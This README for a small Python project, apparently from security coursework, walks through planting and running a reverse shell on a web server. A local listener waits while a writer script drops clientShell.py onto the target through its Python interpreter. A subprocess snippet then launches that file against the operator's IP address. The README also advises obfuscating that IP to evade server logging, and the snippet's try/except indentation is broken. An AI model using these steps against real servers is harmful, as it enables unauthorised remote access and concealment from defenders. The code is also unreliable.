
# glowing-fishstick

This project was started as a result of Cyber Security studies, created purely for testing purposes to demonstrate ability to access web servers with python interpreters and read/write access.

## Server side listener

First run `serverListener.py` locally to ensure you have the listener ready, the connection cannot be made unless this is running first.

```python serverListener.py```

## Write the client side python file remotely

You then can run `pythonWriter.py` using the target web servers python interpreter window. This will only work if the web server is set up to allow write access.

This script will create the `clientShell.py` file on the remote server.

## Executing the client shell

When the server is running locally and the client shell python script is created you can use the python interpreter to execute the python file, substituting the <IP_ADDRESS> value with your IP address.

Note: depending on the servers setup, it may record the IP address used and any other inputs made, so best to use obfuscation techniques when providing an IP address.

```
import subprocess  

# Define the command to run your Python script
command = "python clientShell.py <IP_ADDRESS>"

# Use subprocess to run the command
try:
	subprocess.run(command, shell=True, check=True)
	except subprocess.CalledProcessError as e:
		print(f"Error: {e}")
```